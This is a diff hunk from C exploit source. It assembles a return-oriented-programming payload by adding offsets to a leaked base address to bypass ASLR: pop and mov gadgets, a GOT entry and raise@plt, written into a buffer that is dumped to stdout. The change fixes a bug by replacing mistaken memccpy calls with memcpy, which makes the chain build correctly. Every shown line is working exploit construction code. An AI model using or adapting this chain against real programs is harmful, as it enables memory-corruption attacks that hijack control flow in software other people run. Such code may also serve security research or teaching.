@@ -105,17 +105,17 @@ main(int argc, char **argv)
 	addr_aslr = baddr + POP_EDX_OFF;
 	memcpy(payload + RET_ADDR1_OFF, &addr_aslr, sizeof(addr_aslr));
 	addr_aslr = baddr + MGK1_OFF;
-	memccpy(payload + DATA1_OFF, &addr_aslr, sizeof(addr_aslr));
+	memcpy(payload + DATA1_OFF, &addr_aslr, sizeof(addr_aslr));
 	addr_aslr = baddr + POP_EBX_OFF;
-	memccpy(payload + RET_ADDR2_OFF, &addr_aslr, sizeof(addr_aslr));
+	memcpy(payload + RET_ADDR2_OFF, &addr_aslr, sizeof(addr_aslr));
 	addr_aslr = baddr + MOV_INDIR_EBX_EDX_OFF;
 	memcpy(payload + RET_ADDR3_OFF, &addr_aslr, sizeof(addr_aslr));
 	addr_aslr = baddr + POP_EBX_OFF;
-	memccpy(payload + RET_ADDR4_OFF, &addr_aslr, sizeof(addr_aslr));
+	memcpy(payload + RET_ADDR4_OFF, &addr_aslr, sizeof(addr_aslr));
 	addr_aslr = baddr + GOT_OFF;
-	memccpy(payload + DATA2_OFF, &addr_aslr, sizeof(addr_aslr));
+	memcpy(payload + DATA2_OFF, &addr_aslr, sizeof(addr_aslr));
 	addr_aslr = baddr + RAISE_PLT_OFF;
-	memccpy(payload + RET_ADDR5_OFF, &addr_aslr, sizeof(addr_aslr));
+	memcpy(payload + RET_ADDR5_OFF, &addr_aslr, sizeof(addr_aslr));
 
 	/*
 	 * dump the payload in 'stdout'
